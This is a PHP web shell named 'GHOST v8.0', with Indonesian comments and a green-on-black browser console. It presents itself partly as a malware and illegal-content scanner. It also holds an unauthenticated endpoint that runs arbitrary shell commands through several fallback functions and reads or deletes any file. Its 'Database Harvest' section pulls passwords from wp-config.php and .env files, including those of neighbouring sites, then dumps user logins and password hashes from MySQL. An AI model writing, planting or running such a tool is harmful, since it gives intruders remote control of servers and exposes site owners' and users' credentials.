<?php
/**
 * GHOST v8.0 — The Bulletproof
 */

@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// [01] SMART EXEC (Anti-Timeout)
function g_exec($cmd, $timeout = 15) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    $methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen'];
    foreach ($methods as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return ['out'=>$out]; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out]; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out]; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return ['out'=>implode("\n", $o)]; }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return ['out'=>$r];} }
    }
    return ['out'=>"[-] All execution methods blocked."];
}

function g_read($path) {
    if (!@is_file($path)) return "";
    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    return g_exec('cat ' . escapeshellarg($path))['out'];
}

// [02] DEEP SCANNER (PHP Native, Anti-Timeout)
function g_scan_files() {
    $res = ['malware'=>[], 'illegal'=>[], 'scanned'=>0];
    $keywords = ['slot','gacor','togel','judi','maxwin','bokep','porno','scam','phising'];
    $sigs = ['eval($_', 'base64_decode', 'gzinflate', 'shell_exec', 'passthru', 'system(', 'assert('];
    $ignore = ['jpg','png','gif','mp4','pdf','zip','tar','gz','sqlite','log','svg','ico','woff','ttf'];
    
    // Menggunakan RecursiveDirectoryIterator tapi dengan filter ketat
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($GLOBALS['GHOST_ROOT'], FilesystemIterator::SKIP_DOTS));
        foreach ($it as $f) {
            if (!$f->isFile()) continue;
            $ext = strtolower($f->getExtension());
            if (in_array($ext, $ignore)) continue;
            if ($f->getSize() > 3 * 1024 * 1024) continue; // Max 3MB per file
            
            $res['scanned']++;
            $path = $f->getPathname();
            $c = g_read($path);
            
            $hits = [];
            foreach ($sigs as $s) { if (stripos($c, $s) !== false) $hits[] = $s; }
            if (count($hits) >= 2 || preg_match('/eval\s*\(\s*(base64_decode|\$_)/i', $c)) {
                $res['malware'][] = ['file'=>$path, 'desc'=>'Backdoor/RCE ('.count($hits).' sig)'];
            } elseif ($ext === 'php' && strlen(trim($c)) < 10) {
                $res['malware'][] = ['file'=>$path, 'desc'=>'File PHP kosong/truncated.'];
            }
            
            $kw_found = [];
            foreach ($keywords as $k) { if (stripos($c, $k) !== false) $kw_found[] = $k; }
            if ($kw_found) $res['illegal'][] = ['file'=>$path, 'keywords'=>array_unique($kw_found)];
        }
    } catch (Throwable $e) {}
    return $res;
}

// [03] DB HARVEST (Multi-Fallback)
function g_db_harvest() {
    $logs = []; $info = []; $connected = false; $dir = $GLOBALS['GHOST_ROOT'];
    
    // 1. Cari langsung di root
    $configs = ['wp-config.php', '.env', 'configuration.php', 'config/database.php'];
    foreach ($configs as $cf) {
        if (@is_file("$dir/$cf")) {
            $c = g_read("$dir/$cf");
            $logs[] = "[+] Found: $cf";
            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
            if ($u[1] && $p[1]) { $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
        }
    }
    
    // 2. Fallback: Scan folder tetangga (Parent Directory)
    if (empty($info)) {
        $logs[] = "[*] Direct read failed. Scanning parent dir for config...";
        $parent = dirname($dir);
        $dirs = @scandir($parent) ?: [];
        foreach ($dirs as $d) {
            if ($d === '.' || $d === '..') continue;
            $test_file = $parent . '/' . $d . '/wp-config.php';
            if (@is_file($test_file)) {
                $logs[] = "[+] Found in parent: $d/wp-config.php";
                $c = g_read($test_file);
                if (preg_match('/DB_PASSWORD.*[\'"]([^\'"]+)/', $c, $m)) { $info = ['pass'=>$m[1]]; $logs[] = "[!] Password: ".$m[1]; break; }
            }
        }
    }
    
    // 3. Connect & Dump
    if (!empty($info['user']) && !empty($info['pass'])) {
        $logs[] = "[*] Connecting to MySQL...";
        $conn = @mysqli_connect('localhost', $info['user'], $info['pass']);
        if ($conn) {
            $logs[] = "[!] DB Connected!";
            $q = @mysqli_query($conn, "SELECT user_login, user_pass FROM wp_users LIMIT 5");
            if (!$q) $q = @mysqli_query($conn, "SELECT username, password FROM users LIMIT 5");
            if ($q) { while ($r = mysqli_fetch_assoc($q)) { $logs[] = "Data: ".json_encode($r); } }
        } else $logs[] = "[-] MySQL connection failed.";
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// [04] ROUTER
$act = $_POST['act'] ?? '';
if ($act) {
    header('Content-Type: application/json');
    if ($act === 'scan') echo json_encode(g_scan_files());
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path']??'')]);
    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path']??'')?'ok':'fail']);
    elseif ($act === 'exec') echo json_encode(g_exec($_POST['cmd']??''));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v8.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; }
    table { width:100%; border-collapse:collapse; margin-top:10px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; font-size:12px; }
    th { background:#222; }
    .btn-red { border-color:#f00; color:#f00; }
    .btn-red:hover { background:#f00; color:#000; }
</style>
</head>
<body>

<div class="box">
    <h2>[+] Deep Malware Scan</h2>
    <button onclick="runScan()">Scan Semua File</button>
    <div id="scan-status" style="margin-top:10px;"></div>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] Database Harvest</h2>
    <button onclick="runDb()">Scan DB (Multi-Method)</button>
    <pre id="db-result">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    return await r.json();
}

// FIXED UI SCANNER
async function runScan() {
    document.getElementById('scan-status').innerText = 'Scanning (bisa memakan waktu beberapa detik)...';
    document.getElementById('scan-results').innerHTML = '';
    
    try {
        const d = await api('scan');
        document.getElementById('scan-status').innerText = `Selesai. Total File: ${d.scanned} | Malware: ${d.malware.length} | Ilegal: ${d.illegal.length}`;
        
        // Render pakai DocumentFragment agar browser tidak hang
        const frag = document.createDocumentFragment();
        
        if (d.malware.length) {
            const tbl = document.createElement('table');
            tbl.innerHTML = `<tr><th>Path</th><th>Desc</th><th>Aksi</th></tr>`;
            d.malware.forEach(x => {
                const tr = document.createElement('tr');
                tr.innerHTML = `<td>${esc(x.file)}</td><td>${esc(x.desc)}</td>
                    <td><button onclick="view('${esc(x.file)}')">View</button>
                        <button class="btn-red" onclick="del('${esc(x.file)}')">Delete</button></td>`;
                tbl.appendChild(tr);
            });
            frag.appendChild(tbl);
        }
        
        if (d.illegal.length) {
            const h3 = document.createElement('h3'); h3.innerText = 'Konten Ilegal'; frag.appendChild(h3);
            const tbl = document.createElement('table');
            tbl.innerHTML = `<tr><th>Path</th><th>Keyword</th><th>Aksi</th></tr>`;
            d.illegal.forEach(x => {
                const tr = document.createElement('tr');
                tr.innerHTML = `<td>${esc(x.file)}</td><td>${esc(x.keywords.join(', '))}</td>
                    <td><button onclick="view('${esc(x.file)}')">View</button></td>`;
                tbl.appendChild(tr);
            });
            frag.appendChild(tbl);
        }
        
        document.getElementById('scan-results').appendChild(frag);
    } catch(e) {
        document.getElementById('scan-status').innerText = 'Error: ' + e.message;
    }
}

// FIXED UI DB
async function runDb() {
    document.getElementById('db-result').innerText = 'Running...';
    try {
        const d = await api('db_scan');
        document.getElementById('db-result').innerText = JSON.stringify(d, null, 2);
    } catch(e) {
        document.getElementById('db-result').innerText = 'Error: ' + e.message;
    }
}

// FILE OPS
async function view(p) { const d = await api('read_file',{path:p}); alert(d.content.slice(0,1000)); }
async function del(p) { if(!confirm('Hapus?')) return; await api('del_file',{path:p}); runScan(); }

// CONSOLE
async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+d.out;
}
</script>
</body>
</html>
